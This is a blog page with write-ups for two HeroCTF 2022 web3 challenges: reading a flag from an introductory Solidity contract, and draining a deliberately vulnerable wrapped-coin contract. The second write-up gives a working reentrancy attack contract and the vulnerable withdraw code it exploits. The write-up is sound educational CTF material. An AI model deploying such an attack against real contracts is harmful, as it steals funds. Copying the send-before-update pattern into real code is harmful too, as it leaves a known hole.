@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Writeup for the web3 challenge “Let’s introduce ourselves”For this challenge we have to run the blockchain and connect to it. First off, we have to add the melcoin to our metamask wallet. On the heroc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeups for Heroctf 2022">
+<meta property="og:url" content="http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/index.html">
+<meta property="og:site_name" content="Waihu">
+<meta property="og:description" content="Writeup for the web3 challenge “Let’s introduce ourselves”For this challenge we have to run the blockchain and connect to it. First off, we have to add the melcoin to our metamask wallet. On the heroc">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-07-19T00:54:18.037Z">
+<meta property="article:modified_time" content="2022-07-19T00:54:18.037Z">
+<meta property="article:author" content="Waihu">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Writeups for Heroctf 2022</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Posts</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/07/19/2022-4-14-00-00-00-badchars/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&text=Writeups for Heroctf 2022"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&title=Writeups for Heroctf 2022"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&is_video=false&description=Writeups for Heroctf 2022"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Writeups for Heroctf 2022&body=Check out this article: http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&title=Writeups for Heroctf 2022"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&title=Writeups for Heroctf 2022"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&title=Writeups for Heroctf 2022"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&title=Writeups for Heroctf 2022"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&name=Writeups for Heroctf 2022&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&t=Writeups for Heroctf 2022"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup-for-the-web3-challenge-%E2%80%9CLet%E2%80%99s-introduce-ourselves%E2%80%9D"><span class="toc-number">1.</span> <span class="toc-text">Writeup for the web3 challenge “Let’s introduce ourselves”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup-for-the-web3-challenge-%E2%80%9CReady-to-hack%E2%80%9D"><span class="toc-number">2.</span> <span class="toc-text">Writeup for the web3 challenge “Ready to hack”</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Writeups for Heroctf 2022
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Waihu</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-07-19T00:54:18.037Z" itemprop="datePublished">2022-07-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Writeup-for-the-web3-challenge-“Let’s-introduce-ourselves”"><a href="#Writeup-for-the-web3-challenge-“Let’s-introduce-ourselves”" class="headerlink" title="Writeup for the web3 challenge “Let’s introduce ourselves”"></a>Writeup for the web3 challenge “Let’s introduce ourselves”</h2><p>For this challenge we have to run the blockchain and connect to it. First off, we have to add the melcoin to our metamask wallet. On the heroctf blockchain they have a tutorial for how it is done:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Add to Metamask</span><br><span class="line"></span><br><span class="line">To add the Herochain to Metamask, follow these steps :</span><br><span class="line">        - Go into Metamask settings -&gt; networks and click on &quot;Add Network&quot;</span><br><span class="line">        - Enter the following informations :</span><br><span class="line">                Network name     : Herochain</span><br><span class="line">                New RPC URL      : http://blockchain.heroctf.fr:8502 OR http://161.97.134.238:8502/</span><br><span class="line">                Chain ID         : 1337</span><br><span class="line">                Currency Symbol  : HERO</span><br><span class="line">                Block explorer   : Leave empty (it would make it too easy right ?)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Now we are connected to the network. We still need some coins, which we can do by going to their faucet site and paste our wallet address. They give us 5 melcoins.</p>
+<p>So for challenge 0 we get this sourcecode:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.13</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @dev : iHuggsy</span></span><br><span class="line">contract Introduction</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">        Before going into the source code, make sure you visited http://blockchain.heroctf.fr:22000/help if you need it !</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        THERE IS ONE (1) RULE :</span></span><br><span class="line"><span class="comment">            - The whole node system and mining system (and machines that are part of this system) </span></span><br><span class="line"><span class="comment">              does not belong to ANY of the challenges, any attempt to use them in a </span></span><br><span class="line"><span class="comment">              way that is not considered normal in a blockchain environment, pentest them </span></span><br><span class="line"><span class="comment">              or even scan them WILL result in a ban of your entire team without any notice.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        By interacting with the `accept_rules` function that follows, you are signing a contract </span></span><br><span class="line"><span class="comment">        that you agree with the rule.</span></span><br><span class="line"><span class="comment">        (Even if you don&#x27;t interact with it, you agree to it lol)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Have a good one !</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        If you run into any problem, feel free to DM me on the Discord </span></span><br><span class="line"><span class="comment">        @dev : iHuggsy</span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line"></span><br><span class="line">    bytes32 flags;</span><br><span class="line">    <span class="built_in">mapping</span> (address =&gt; <span class="type">bool</span>) accepted_rules;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">constructor</span> (bytes32 _flagz)</span><br><span class="line">    &#123;</span><br><span class="line">        flags = _flagz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">get_flag_part_one</span><span class="params">()</span> external view <span class="title">returns</span> <span class="params">(bytes32)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(accepted_rules[msg.sender] == <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> flags;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">accept_rules</span><span class="params">()</span> external</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        accepted_rules[msg.sender] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We can deploy the contract from the heroctf blockchain site. If we paste the sourcecode into Remix and compile, we can go to the <code>Deploy &amp; run transactions</code> and connect with Metamask and then run the contract from the address, which we get on the heroctf blockchain site. Then we just have to agree to the rules and get our flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">decoded output:</span><br><span class="line">&#123;</span><br><span class="line">	&quot;0&quot;: &quot;bytes32: 0x4865726f7b57336c43306d655f325f48337230436834316e5f5740674d317d00&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Decoding the hexstring gives the flag.<br><br><br><br></p>
+<h2 id="Writeup-for-the-web3-challenge-“Ready-to-hack”"><a href="#Writeup-for-the-web3-challenge-“Ready-to-hack”" class="headerlink" title="Writeup for the web3 challenge “Ready to hack”"></a>Writeup for the web3 challenge “Ready to hack”</h2><p>Prompt:<br>Now that we’re introduced, let’s jump into it. this contract acts like a wrapper around $MEL.<br>We can’t say it holds a gigantic amount of money, but it might be a kickstarter for you!<br>Of course, the ontract belongs to a malicious organization, which is why we’re hacking it.<br>Don’t hack legit organizations.<br>Empty the contract from it’s mooney to get the flag.</p>
+<p>Now we actually have to do something with the knowledge gained from the introduction. We get the sourcecode to the contract from the heroctf blockchain site:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.13</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    This contract implements &quot;WMEL&quot; (Wrapped MEL). You get an ERC20 version of Melcoin where 1WMEL == 1MEL at all times.</span></span><br><span class="line"><span class="comment">    This is a beta version !</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// @dev : iHuggsy</span></span><br><span class="line">contract WMEL</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">mapping</span>(address =&gt; uint) <span class="keyword">public</span> balances;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">constructor</span> () payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">deposit</span><span class="params">()</span> external payable </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">withdraw</span><span class="params">()</span> <span class="keyword">public</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        uint bal = balances[msg.sender];</span><br><span class="line">        <span class="built_in">require</span>(bal &gt; <span class="number">0</span>);</span><br><span class="line">        (<span class="type">bool</span> sent, ) = msg.sender.call&#123;value: bal&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(sent, <span class="string">&quot;Failed to send Ether&quot;</span>);</span><br><span class="line">        balances[msg.sender] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Helper function to check the balance of this contract</span></span><br><span class="line">    <span class="function">function <span class="title">getBalance</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">address</span>(<span class="keyword">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>This contract holds some melcoins and we want to empty the contract to get the flag. We see two functions and a helper function. The helper function only lets us see how many melcoins are left on the contract. <code>mapping(address =&gt; uint) public balances;</code> is where the users balance is stored. In the deposit function the balances variable is increased with the users value. Lets get to know the withdraw function. The withdraw function sets an unsigned integer as bal, which is equal to the users balance. Then it checks that bal is larger than 0. If bal is larger than 0 it calls the fallback function of msg.sender with the value of bal, and afterwards it sets the bal back to 0. </p>
+<p>Because the contract makes the transaction before setting our balance to zero, it is vulnerable to a reentrancy attack, which is what we will exploit. We can create another smart contract, which will attack the original smart contract. This is what my exploit contract looked like:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.13</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./target.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    WMEL <span class="keyword">public</span> bank;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">constructor</span>(address _bankAddress) &#123;</span><br><span class="line">        bank = <span class="built_in">WMEL</span>(_bankAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fallback</span>() external payable &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">address</span>(bank).balance &gt;= <span class="number">1</span> ether) &#123;</span><br><span class="line">            bank.<span class="built_in">withdraw</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">attack</span><span class="params">()</span> external payable </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value &gt;= <span class="number">1</span> ether);</span><br><span class="line">        bank.deposit&#123;value: <span class="number">1</span> ether&#125;();</span><br><span class="line">        bank.<span class="built_in">withdraw</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>When deploying it and calling the <code>attack</code> function with a value of 1 ether the ether will start flowing and the smart contract is empty. Now we just need to verify on the website, and then we’ll be rewarded with a cool flag.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup-for-the-web3-challenge-%E2%80%9CLet%E2%80%99s-introduce-ourselves%E2%80%9D"><span class="toc-number">1.</span> <span class="toc-text">Writeup for the web3 challenge “Let’s introduce ourselves”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup-for-the-web3-challenge-%E2%80%9CReady-to-hack%E2%80%9D"><span class="toc-number">2.</span> <span class="toc-text">Writeup for the web3 challenge “Ready to hack”</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&text=Writeups for Heroctf 2022"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&title=Writeups for Heroctf 2022"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&is_video=false&description=Writeups for Heroctf 2022"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Writeups for Heroctf 2022&body=Check out this article: http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&title=Writeups for Heroctf 2022"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&title=Writeups for Heroctf 2022"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&title=Writeups for Heroctf 2022"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&title=Writeups for Heroctf 2022"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&name=Writeups for Heroctf 2022&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/07/19/2022-5-29-13-00-00-heroctf/&t=Writeups for Heroctf 2022"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Waihu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Posts</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
